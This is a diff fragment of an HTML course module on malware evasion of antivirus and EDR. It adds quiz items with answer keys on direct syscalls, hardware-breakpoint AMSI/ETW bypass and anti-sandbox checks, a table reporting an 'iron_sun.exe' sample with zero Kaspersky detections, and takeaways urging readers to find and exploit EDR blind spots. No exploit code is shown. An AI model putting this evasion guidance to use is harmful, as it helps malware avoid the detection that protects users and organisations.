+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz1')">
+                C. They encrypt the syscall number so the EDR cannot read it
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz1')">
+                D. They run in kernel mode where EDR has no visibility
+            </div>
+            <div class="quiz-feedback" id="quiz1-feedback"></div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <div class="quiz-container" id="quiz2">
+            <h3>Quiz 2: Hardware Breakpoints</h3>
+            <p><strong>Question:</strong> In the Dark Room technique, what is the primary advantage of using hardware breakpoints (DR0-DR3) over directly patching AMSI/ETW functions?</p>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz2')">
+                A. HWBPs are permanent and survive process reboots
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz2')">
+                B. HWBPs can monitor up to 16 functions simultaneously
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz2')">
+                C. HWBPs do not modify .text sections, evading memory integrity scanners
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz2')">
+                D. HWBPs work in kernel mode without needing a driver
+            </div>
+            <div class="quiz-feedback" id="quiz2-feedback"></div>
+        </div>
 
-        <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>Evasion is layers, not tricks:</strong> One layer fails, the next catches. Eight layers = eight chances to survive.</li>
-            <li><strong>Static analysis is blind to runtime:</strong> XOR strings, dynamic APIs, anti-sandbox — all invisible until execution.</li>
-            <li><strong>Behavioral analysis needs behavior:</strong> If you do nothing suspicious (no network, no registry), EDR has nothing to flag.</li>
-            <li><strong>MinGW > MSVC for evasion:</strong> No Microsoft compiler signatures, no standard library bloat.</li>
-            <li><strong>Test on real AV:</strong> VirusTotal is a snapshot. Kaspersky 21.25 live is the truth.</li>
-        </ul>
+        <div class="quiz-container" id="quiz3">
+            <h3>Quiz 3: EDR Evasion Stack</h3>
+            <p><strong>Question:</strong> Which layer of the 8-Layer Evasion Stack specifically addresses the risk of automated sandbox analysis (e.g., Cuckoo, ANY.RUN)?</p>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz3')">
+                A. Layer 1: XOR Obfuscation
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz3')">
+                B. Layer 3: Anti-Sandbox
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz3')">
+                C. Layer 6: Beacon Jitter
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz3')">
+                D. Layer 8: HWBP Bypass
+            </div>
+            <div class="quiz-feedback" id="quiz3-feedback"></div>
+        </div>
 
-        <div class="evidence-box" style="margin-top: 2rem;">
+        <!-- ==================== VERIFICATION ==================== -->
+        <h2 id="verify">13. Verification Status</h2>
+
+        <div class="evidence-box">
             <h3>🔬 Verification Status</h3>
-            <table style="width: 100%; border-collapse: collapse;">
+            <table>
                 <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">Kaspersky 21.25 scan (iron_sun.exe)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42 — 0 detections</td>
@@ -375,12 +1633,55 @@ if (elapsed < 4000) {
                     <td style="padding: 0.5rem;">Anti-sandbox gates</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
                 </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Direct syscalls (SysWhispers)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Syscall proxying / indirect syscalls</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">AMSI bypass (context + patch)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">ETW bypass (NtTraceEvent patch)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">NTDLL unhooking</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Manual mapping</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Sleep obfuscation (Ekko-style)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">HWBP AMSI+ETW bypass</td>
+                    <td style="padding: 0.5rem;">HWBP AMSI+ETW bypass (Dark Room)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
                 </tr>
             </table>
         </div>
+
+        <h2>Key Takeaways</h2>
+
+        <ul style="margin-left: 1.5rem; line-height: 2;">
+            <li><strong>Evasion is layers, not tricks:</strong> One layer fails, the next catches. Eight layers = eight chances to survive.</li>
+            <li><strong>Static analysis is blind to runtime:</strong> XOR strings, dynamic APIs, anti-sandbox — all invisible until execution.</li>
+            <li><strong>Behavioral analysis needs behavior:</strong> If you do nothing suspicious (no network, no registry), EDR has nothing to flag.</li>
+            <li><strong>Direct syscalls bypass user-mode hooks:</strong> But advanced EDRs use stack walking — use indirect syscalls (proxying) for those.</li>
+            <li><strong>AMSI and ETW are user-mode:</strong> They can be patched, bypassed, or blinded. But patching is detectable — use HWBP (Dark Room) for stealth.</li>
+            <li><strong>Manual mapping is invisible loading:</strong> No PEB entry, no kernel callbacks, no IAT hooks. The gold standard for DLL loading.</li>
+            <li><strong>Sleep obfuscation encrypts while dormant:</strong> EDR memory scanners see garbage. Decrypt only when active.</li>
+            <li><strong>MinGW > MSVC for evasion:</strong> No Microsoft compiler signatures, no standard library bloat.</li>
+            <li><strong>Test on real AV:</strong> VirusTotal is a snapshot. Kaspersky 21.25 live is the truth.</li>
+            <li><strong>EDR is software watching software:</strong> It has blind spots. Find them, exploit them, stay invisible.</li>
+        </ul>
 
         <div class="nav" style="margin-top: 2rem;">
             <a href="index.html">← Home</a>
@@ -388,5 +1689,52 @@ if (elapsed < 4000) {
             <a href="MODULE_14_CLOUD_FILES.html">Module 14 →</a>
         </div>
     </div>
+
+    <script>
+        function checkAnswer(element, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById(quizId + '-feedback');
+            
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === element && opt.dataset.correct !== 'true') {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            feedback.classList.add('show');
+            if (element.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✅ Correct!</strong> ' + getExplanation(quizId);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>❌ Incorrect.</strong> ' + getExplanation(quizId);
+            }
+        }
+        
+        function getExplanation(quizId) {
+            const explanations = {
+                'quiz1': 'Direct syscalls bypass NTDLL entirely by executing the syscall instruction directly from the malware\'s own code. The EDR\'s hooks in NTDLL are never touched because the malware never calls NTDLL functions.',
+                'quiz2': 'Hardware breakpoints use CPU debug registers (DR0-DR3) without modifying executable memory. Memory integrity scanners (which watch for .text patches) cannot detect HWBPs because no memory is changed — only CPU state.',
+                'quiz3': 'Layer 3 (Anti-Sandbox) specifically targets automated analysis environments through timing checks, RAM checks, CPU core checks, and VM artifact detection. This prevents sandboxes from observing the malware\'s real behavior.'
+            };
+            return explanations[quizId] || '';
+        }
+
+        // Copy button functionality
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const codeBlock = this.parentElement;
+                const text = codeBlock.innerText.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    this.textContent = 'COPIED!';
+                    setTimeout(() => { this.textContent = 'COPY'; }, 2000);
+                });
+            });
+        });
+    </script>
 </body>
 </html>
